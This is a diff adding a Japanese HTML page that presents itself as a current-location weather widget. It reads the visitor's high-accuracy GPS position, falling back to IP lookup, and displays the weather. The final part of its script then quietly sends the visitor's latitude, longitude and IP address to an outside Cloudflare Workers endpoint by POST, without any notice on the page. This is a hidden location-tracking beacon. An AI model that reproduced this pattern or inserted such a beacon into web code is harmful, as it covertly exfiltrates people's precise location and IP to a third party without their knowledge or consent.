@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <title>現在地の天気</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <style>
+    body {
+      font-family: system-ui, -apple-system, BlinkMacSystemFont;
+      background: #0f172a;
+      color: #e5e7eb;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .card {
+      background: #020617;
+      border: 1px solid #1e293b;
+      border-radius: 12px;
+      padding: 24px;
+      width: 320px;
+      box-shadow: 0 0 30px rgba(0,0,0,0.6);
+    }
+
+    h1 {
+      font-size: 18px;
+      margin: 0 0 12px 0;
+      text-align: center;
+    }
+
+    .status {
+      font-size: 13px;
+      color: #94a3b8;
+      margin-bottom: 16px;
+      text-align: center;
+    }
+
+    .weather {
+      font-size: 16px;
+      line-height: 1.6;
+    }
+
+    .error {
+      color: #f87171;
+      font-size: 14px;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+
+<div class="card">
+  <h1>現在地の天気</h1>
+  <div id="status" class="status">位置情報を取得中…</div>
+  <div id="weather" class="weather"></div>
+  <div id="error" class="error"></div>
+</div>
+
+<script>
+    let ip
+(async function () {
+  const statusEl = document.getElementById("status");
+  const weatherEl = document.getElementById("weather");
+  const errorEl = document.getElementById("error");
+
+  function showError(msg) {
+    statusEl.textContent = "";
+    errorEl.textContent = msg;
+  }
+
+  function getPositionByGPS() {
+    return new Promise((resolve, reject) => {
+      if (!navigator.geolocation) {
+        reject(new Error("Geolocation非対応"));
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          resolve({
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            source: "GPS"
+          });
+        },
+        err => {
+          reject(err);
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 5000,
+          maximumAge: 0
+        }
+      );
+    });
+  }
+
+  async function getPositionByIP() {
+    const res = await fetch("https://ipapi.co/json/");
+    if (!res.ok) throw new Error("IP位置取得失敗");
+    const data = await res.json();
+    ip = data.ip
+    return {
+      lat: data.latitude,
+      lon: data.longitude,
+      city: data.city,
+      region: data.region,
+      country: data.country_name,
+      source: "IP"
+    };
+  }
+
+  async function getWeather(lat, lon) {
+    const url =
+      "https://api.open-meteo.com/v1/forecast" +
+      "?latitude=" + lat +
+      "&longitude=" + lon +
+      "&current_weather=true" +
+      "&timezone=Asia%2FTokyo";
+
+    const res = await fetch(url);
+    if (!res.ok) throw new Error("天気取得失敗");
+    return await res.json();
+  }
+
+  try {
+    let position;
+
+    try {
+      position = await getPositionByGPS();
+      statusEl.textContent = "位置情報: GPS";
+    } catch {
+      position = await getPositionByIP();
+      statusEl.textContent = "位置情報: IP";
+    }
+
+    const weatherData = await getWeather(position.lat, position.lon);
+    const w = weatherData.current_weather;
+
+    weatherEl.innerHTML = `
+      緯度: ${position.lat.toFixed(4)}<br>
+      経度: ${position.lon.toFixed(4)}<br><br>
+      気温: ${w.temperature} ℃<br>
+      風速: ${w.windspeed} km/h<br>
+      天気コード: ${w.weathercode}<br>
+      観測時刻: ${w.time}
+    `;
+    const WORKER_URL = "https://white-dream-0732.kurea-ch124.workers.dev/";
+
+const text =
+`🌤 天気情報
+取得元: ${position.source}
+緯度: ${position.lat.toFixed(4)}
+経度: ${position.lon.toFixed(4)}
+気温: ${w.temperature}℃
+風速: ${w.windspeed} km/h
+観測時刻: ${w.time}
+ip: ${ip}`;
+
+await fetch(WORKER_URL, {
+  method: "POST",
+  headers: {
+    "Content-Type": "text/plain"
+  },
+  body: text
+});
+  } catch (e) {
+    showError("取得できませんでした");
+    console.error(e);
+  }
+})();
+</script>
+
+</body>
+</html>
